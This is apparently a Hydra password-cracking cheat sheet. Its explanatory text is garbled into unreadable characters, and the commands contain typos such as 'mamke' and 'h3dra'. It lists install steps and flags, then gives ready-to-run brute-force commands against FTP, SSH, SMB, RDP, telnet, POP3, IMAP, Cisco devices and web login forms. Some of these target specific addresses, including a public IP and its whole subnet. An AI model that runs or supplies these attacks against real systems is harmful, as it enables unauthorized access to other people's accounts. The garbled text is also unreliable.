������ַ��http://www.thc.org

1����װ

	��ѹ		tar -zxvf hydra-7.4.2.tar.gz 
	����&��װ	./configure  ==>> make && mamke install

2����ʽ

	hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV]

	���ͣ�

		-R ��������һ�ν��Ƚ����ƽ�
		-S ����SSL���ӣ���д��S��
		-s PORT �����Ĭ�϶˿ڣ���ͨ���������ָ��
		-l LOGIN Сд������ָ���ƽ���û������ض��û��ƽ�
		-L FILE ��д������ָ���û����û����ֵ�
		-p PASS Сд������ָ�������ƽ⣬���ã�һ���ǲ��������ֵ�
		-P FILE ��д������ָ�������ֵ�
		-e ns �����ѡ�n����������̽��s��ʹ��ָ���˻���������̽
		-C FILE ʹ��ð�ŷָ��ʽ ���� "��¼��:����"������-L/-P����
		-M FILE ָ��Ŀ���б��ļ�һ��һ��
		-o FILE ָ���������ļ�
		-f ��ʹ��-M�����Ժ� �ҵ���һ�Ե�¼�����������ʱ����ֹ�ƽ�
		-t TASKS ͬʱ���е��߳�����Ĭ��Ϊ16
		-w TIME �������ʱ��ʱ�䣬��λ�룬Ĭ����30s
		-v / -V ��ʾ��ϸ����

3��ʵ���ƽ�ftp�ʺ�����
	Ŀ���ַ�� 203.133.5.88
	����һ��hydra -L /home/dict/ftpuser.lst -P /home/dict/ftppwd.lst 203.133.5.* ftp		��������������c�εģ������������ֵ��ļ���
	�������hydra -l administrator -P /home/dict/pwd.lst -v 203.133.5.88 ftp

4��ʵ���ƽ�samba����

	SMBЭ��ͨ���Ǳ�windowsϵ������ʵ�ִ��̺ʹ�ӡ������
	���ø�ftp���ƣ���ftp��Ϊsam����	

5����վ��̨�����ƽ�

	sudo hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form "index.php:name=^USER^&pwd=^PASS^:"

	���ͣ��ƽ���û�����admin�������ֵ���pass.lst���ƽ���������ok.lst��-t��ͬʱ�߳���Ϊ1��-f�ǵ��ƽ���һ�������ֹͣ��ip�Ǳ��أ�����Ŀ��ip��http-post-form��ʾ�ƽ��ǲ���http��post��ʽ�ύ�ı������ƽ�����������ҳ�ж�Ӧ�ı��ֶε�name����,����title�е������Ǳ�ʾ����½�ķ�����Ϣ��ʾ�������Զ��塣

6.�ƽ�ftp

	hydra ip ftp -l �û��� -P �����ֵ� -t �߳�(Ĭ��16) -vV
	hydra ip ftp -l �û��� -P �����ֵ� -e ns -vV

7.get��ʽ�ύ �ƽ�web��¼

	hydra -l �û��� -p �����ֵ� -t �߳� -vV -e ns ip http-get /web/
	hydra -l �û��� -p �����ֵ� -t �߳� -vV -e ns -f ip http-get /web/index.asp

8.�ƽ�ssh
	
	hydra -l �û��� -p �����ֵ� -t �߳� -vV -e ns ip ssh2
	hydra -l �û��� -p �����ֵ� -t �߳� -o save.log -vV ip ssh2

9.�ƽ�teamspeak

	hydra -l �û��� -P �����ֵ� -s �˿ں� -vV ip teamspeak

10.post��ʽ�ύ �ƽ�web��¼

	hydra -l �û��� -P �����ֵ� -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"

11.cisco
	
	hydra -P pass.txt 192.168.1.229 cisco
	hydra -m cloud -P pass.txt 192.168.1.229 cisco-enable

12.smb
	
	hydra -l administrator -P pass.txt 192.168.0.141 smb

13.pop3
	
	hydra -l muts -P pass.txt my.pop3.mail pop3

14.https
	
	hydra -m /index.php -l muts -P pass.txt 192.168.0.12 https

15.rdp
	
hydra ip rdp -l administrator -P pass.txt -V

16.http-proxy
	
	hydra -l admin -P pass.txt http-proxy://192.168.0.1

17.imap
	
	hydra -L user.txt -p secret 192.168.0.1 imap PLAIN
	hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN

18.telnet
	
	h3dra ip telnet -l �û� -P �����ֵ� -t 32 -s 23 -e ns -f -V

	